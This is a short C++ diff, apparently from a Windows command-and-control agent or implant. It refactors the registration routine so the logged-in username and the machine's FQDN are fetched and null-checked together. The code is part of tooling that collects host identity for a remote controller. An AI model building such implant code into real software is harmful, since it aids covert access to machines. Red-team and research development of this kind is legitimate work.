@@ -34,16 +34,12 @@ void BaseCommunicator::QueueRegistrationDataAsFirstAgentOutput()
         STRING_AGENT_REGISTER_LEN,
         strAgentRegister);
 
-    // Get logged-in username
+    // Get logged-in username and hostname of computer
     LPVOID pUsername = this->pWinApiCustom->GetUserNameCustom();
-    if (pUsername == NULL)
+    LPVOID pFqdnComputer = this->pWinApiCustom->GetFQDNComputer();
+    if (pUsername == NULL || pFqdnComputer == NULL)
         goto CLEANUP;
     DWORD usernameLen = StrLen((PCHAR)pUsername);
-
-    // Get hostname of computer
-    LPVOID pFqdnComputer = this->pWinApiCustom->GetFQDNComputer();
-    if (pFqdnComputer == NULL)
-        goto CLEANUP;
     DWORD fqdnComputerLen = StrLen((PCHAR)pFqdnComputer);
 
     // Prepare registration data
